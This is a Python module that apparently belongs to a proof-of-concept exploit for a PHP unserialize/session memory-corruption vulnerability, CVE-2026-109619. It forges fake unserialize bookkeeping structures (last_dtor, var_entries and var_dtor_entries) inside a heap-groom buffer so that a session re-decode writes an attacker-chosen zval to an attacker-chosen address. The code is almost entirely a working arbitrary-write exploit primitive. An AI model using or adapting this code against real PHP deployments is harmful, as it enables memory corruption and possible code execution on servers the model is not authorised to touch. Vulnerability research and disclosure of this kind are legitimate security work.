#!/usr/bin/env python3
# INDEX: forge last_dtor bookkeeping to write chosen zval | all | needs known groom addresses
"""last_dtor forge: the CVE-2026-109619 fake var_dtor_entries / last_dtor
byte layout. Plants the fake bookkeeping into a groom value so a session
re-decode writes a chosen zval at a chosen address."""
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

FA = 256      # fake php_unserialize_data offset in the groom value
FE = 512      # fake var_entries offset (its ->last)
FD_BASE = 768 # fake var_dtor_entries offset (steers the re-decodes)


def forge_last_dtor_value(size, layout, verbose=True):
    """layout = (A, host copy zend_string, T1, T2) or None (probe mode)."""
    val = bytearray(b"G" * size)
    if layout is None:
        # Probe mode (--a 0): magic last_dtor, layout identical to the real
        # run; the gdb replica script patches the fakes in place at its
        # breakpoint, so the same request performs the write.
        val[16:24] = struct.pack("<Q", 0x5151515151515151)
    else:
        a, copy, t1, t2 = layout
        # --- decode-1 fakes, in the raw groom buffer covering A ---
        k1 = 24 + ((t1 - a - 24) % 16)
        s1, rem = divmod(t1 - (a + k1) - 16, 16)
        assert rem == 0 and s1 + 2 <= 255, (k1, s1)
        val[0:8] = struct.pack("<Q", a + 64)             # A->last = fake_e1
        val[64:72] = struct.pack("<q", 0)                # fake_e1.used_slots
        val[16:24] = struct.pack("<Q", a + k1)           # A->last_dtor
        val[k1:k1 + 8] = struct.pack("<q", s1)            # fake_d1.used_slots
        # --- re-decode fakes, inside the live $_POST['g0'] copy ---
        fake_a = copy + 24 + FA
        fake_e2 = copy + 24 + FE
        fd = FD_BASE + ((t2 - (copy + 24 + FD_BASE) - 16) % 16)
        fake_d2 = copy + 24 + fd
        s2, rem = divmod(t2 - fake_d2 - 16, 16)
        assert rem == 0 and s2 + 3 <= 255, (fd, s2)
        val[FA:FA + 8] = struct.pack("<Q", fake_e2)        # last
        val[FA + 8:FA + 16] = struct.pack("<Q", 0)         # first_dtor
        val[FA + 16:FA + 24] = struct.pack("<Q", fake_d2)  # last_dtor
        val[FA + 24:FA + 32] = struct.pack("<Q", 0)        # allowed_classes
        val[FA + 32:FA + 40] = struct.pack("<Q", 0)        # ref_props
        val[FA + 40:FA + 48] = struct.pack("<q", 0)        # cur_depth
        val[FA + 48:FA + 56] = struct.pack("<q", 0)        # max_depth = 0
        val[FE:FE + 8] = struct.pack("<q", 0)              # fake_e2.used_slots
        val[fd:fd + 8] = struct.pack("<q", s2)             # fake_d2.used_slots
        if verbose:
            print(f"[last_dtor_forge] groom layout: A={a:#x} K1={k1} S1={s1} "
                  f"copy={copy:#x} FD={fd} S2={s2} T1={t1:#x} T2={t2:#x}")
    return val
